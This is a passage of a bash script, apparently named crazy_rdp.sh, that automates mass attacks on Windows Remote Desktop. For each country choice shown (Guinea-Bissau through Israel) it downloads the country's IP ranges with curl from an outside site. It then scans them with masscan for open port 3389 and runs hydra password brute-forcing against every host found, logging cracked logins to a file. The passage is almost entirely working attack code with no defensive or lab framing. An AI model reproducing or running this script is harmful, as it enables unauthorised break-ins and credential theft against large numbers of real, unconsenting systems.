read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "77" ]; then
curl http://ipdiapazon.16mb.com/Guinea-bissau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "78" ]; then
curl http://ipdiapazon.16mb.com/Haiti.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "79" ]; then
curl http://ipdiapazon.16mb.com/Holy_see.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "80" ]; then
curl http://ipdiapazon.16mb.com/Honduras.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "81" ]; then
curl http://ipdiapazon.16mb.com/Hong_kong.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "82" ]; then
curl http://ipdiapazon.16mb.com/Hungary.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "83" ]; then
curl http://ipdiapazon.16mb.com/Iceland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "84" ]; then
curl http://ipdiapazon.16mb.com/India.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "85" ]; then
curl http://ipdiapazon.16mb.com/Indonesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "86" ]; then
curl http://ipdiapazon.16mb.com/Iran.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "87" ]; then
curl http://ipdiapazon.16mb.com/Iraq.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "88" ]; then
curl http://ipdiapazon.16mb.com/Ireland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "89" ]; then
curl http://ipdiapazon.16mb.com/Israel.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
